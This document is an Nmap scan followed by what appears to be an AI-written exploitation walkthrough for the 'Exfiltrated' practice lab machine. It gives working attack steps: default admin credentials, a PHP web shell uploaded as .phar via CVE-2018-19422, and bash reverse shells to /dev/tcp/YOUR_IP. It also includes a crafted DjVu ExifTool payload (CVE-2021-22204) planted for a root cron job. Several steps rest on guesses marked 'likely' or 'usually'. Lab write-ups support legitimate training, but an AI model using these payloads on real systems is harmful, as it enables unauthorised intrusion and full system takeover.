
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-30 07:12 CST
Nmap scan report for 192.168.213.163 (192.168.213.163)
Host is up (0.072s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 7 disallowed entries
| /backup/ /cron/? /front/ /install/ /panel/ /tmp/
|_/updates/
|_http-title: Did not follow redirect to http://exfiltrated.offsec/
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.00 seconds
```
Based on the Nmap output and the objectives provided, here is a step-by-step guide to exploiting the **Exfiltrated** machine.

### Step 0: Configuration
The Nmap scan shows a redirect to `http://exfiltrated.offsec/`. You must add this to your hosts file to access the site correctly.

```bash
echo "192.168.213.163 exfiltrated.offsec" | sudo tee -a /etc/hosts
```
*(Replace `192.168.213.163` with your actual target IP).*

---

### Step 1: Enumerate Services and Subrion Version
1.  Navigate to `http://exfiltrated.offsec/` in your browser.
2.  Based on `robots.txt`, navigate to the admin panel: `http://exfiltrated.offsec/panel/`.
3.  Look at the bottom of the login page or the page source.
    *   **Findings:** You will likely see **Subrion CMS 4.2.1**.

---

### Step 2: Gain Access (Default Credentials)
Subrion CMS has known default credentials.
1.  Go to `http://exfiltrated.offsec/panel/`.
2.  Attempt the default credentials:
    *   **Username:** `admin`
    *   **Password:** `admin`
3.  If successful, you will land on the Administrative Dashboard.

---

### Step 3: Exploit File Upload Bypass (Initial Access)
Subrion 4.2.1 is vulnerable to arbitrary file uploads (CVE-2018-19422). It filters `.php` files but allows `.phar` (PHP Archive) files, which execute just like PHP.

1.  **Create a Web Shell:**
    Create a file named `shell.phar` with the following content:
    ```php
    <?php system($_GET['cmd']); ?>
    ```

2.  **Upload the Shell:**
    *   In the Subrion Dashboard, go to **Content -> Uploads**.
    *   Click **Drag & Drop** or **Select files**.
    *   Upload `shell.phar`.

3.  **Verify Execution:**
    *   The file usually lands in `/uploads/`.
    *   Test it: `http://exfiltrated.offsec/uploads/shell.phar?cmd=id`
    *   If you see `uid=33(www-data)...`, you have code execution.

4.  **Get a Reverse Shell:**
    *   Start a listener: `nc -nvlp 4444`
    *   Execute the reverse shell via the URL (URL encode the payload):
    ```bash
    curl "http://exfiltrated.offsec/uploads/shell.phar?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/YOUR_IP/4444%200%3E%261%27"
    ```
    *   You should receive a shell as `www-data`.

---

### Step 4: Craft Malicious DjVu File (CVE-2021-22204)
Once inside, you need to escalate privileges. The system likely runs a cron job that uses **ExifTool** to process images. Older versions of ExifTool are vulnerable to command injection via metadata in DjVu files.

**On your attacker machine:**

1.  **Install dependencies (if needed):** You need `djvulibre-bin` to use `djvumake`.
    ```bash
    sudo apt install djvulibre-bin
    ```

2.  **Create the Payload:**
    We will create a file that, when parsed by ExifTool, executes a reverse shell.
    
    Create a file named `exploit` (no extension):
    ```bash
    (metadata "\c${system('/bin/bash -c \'bash -i >& /dev/tcp/YOUR_IP/80 0>&1\'')};")
    ```
    *(Make sure to change YOUR_IP and use port 80 or another port distinct from your web shell).*

3.  **Compress the payload:**
    ```bash
    bzz exploit exploit.bzz
    ```

4.  **Create the DjVu file:**
    ```bash
    djvumake exploit.djvu INFO=0,0 BGjp=/dev/null ANTz=exploit.bzz
    ```

5.  **Rename to pass image filters (optional but recommended):**
    ```bash
    mv exploit.djvu image.jpg
    ```
    *Note: Even though it is named .jpg, the header is still DjVu, and ExifTool will parse it as such.*

---

### Step 5: Trigger Cron Job for Root
1.  **Transfer the malicious file:**
    Start a python server on your attacker machine: `python3 -m http.server 8000`.
    On the victim machine (`www-data` shell):
    ```bash
    cd /tmp
    wget http://YOUR_IP:8000/image.jpg
    ```

2.  **Identify the Cron Job:**
    Look for the script being run by root. It is usually located in `/opt/` or visible in `/etc/crontab`.
    *   *Likely Scenario:* There is a script checking a specific folder (e.g., `/var/www/html/subrion/uploads/` or a specific `backup` folder) and running `exiftool` on new files.

3.  **Place the Payload:**
    Move your malicious `image.jpg` into the directory the cron job monitors.
    *(Check the `exiftool` version installed on the target with `exiftool -ver` to confirm vulnerability, usually < 12.24).*

4.  **Wait for Root:**
    Start your listener: `nc -nvlp 80`
    Wait for the cron job to execute (usually runs every minute).
    Once `exiftool` tries to read the metadata of your file, the payload executes, and you receive a root shell.